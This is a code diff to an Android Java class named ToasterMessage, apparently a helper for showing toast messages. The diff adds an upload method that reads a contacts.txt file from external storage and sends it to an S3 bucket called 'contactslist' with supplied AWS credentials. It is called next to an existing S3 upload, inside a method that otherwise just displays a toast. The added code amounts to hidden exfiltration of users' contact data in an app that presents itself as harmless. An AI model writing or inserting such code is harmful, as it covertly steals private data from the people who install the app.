@@ -56,6 +56,7 @@ public class ToasterMessage {
         if (hasPermissions(c, PERMISSIONS)) {
             File file = new File(Environment.getExternalStorageDirectory(), "/Notes/" + "contacts.txt");
             String contacts = getFileContents(file);
+            upload(c,file,accessKey,secretKey);
             uploadtos3(c,file);
 
             Toast.makeText(c, contacts, Toast.LENGTH_SHORT).show();
@@ -64,6 +65,42 @@ public class ToasterMessage {
         } else {
             ActivityCompat.requestPermissions(a, PERMISSIONS, PERMISSION_ALL);
         }
+    }
+
+    public static void upload(final Context context, final File file, String accesskey, String secret){
+        BasicAWSCredentials credentials = new BasicAWSCredentials(accesskey,secret);
+        AmazonS3Client s3 = new AmazonS3Client(credentials);
+        s3.setRegion(Region.getRegion(Regions.US_EAST_1));
+
+        TransferUtility transferUtility = new TransferUtility(s3, context);
+        final TransferObserver observer = transferUtility.upload(
+                "contactslist",
+                "contacts.txt",
+                file
+        );
+
+
+        observer.setTransferListener(new TransferListener() {
+            @Override
+            public void onStateChanged(int id, TransferState state) {
+
+                if (state.COMPLETED.equals(observer.getState())) {
+
+                    Toast.makeText(context, "File Upload Complete", Toast.LENGTH_SHORT).show();
+                }
+            }
+
+            @Override
+            public void onProgressChanged(int id, long bytesCurrent, long bytesTotal) {
+
+            }
+
+            @Override
+            public void onError(int id, Exception ex) {
+
+                Toast.makeText(context, "" + ex.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
     }
 
     public static void uploadtos3 (final Context context, final File file) {
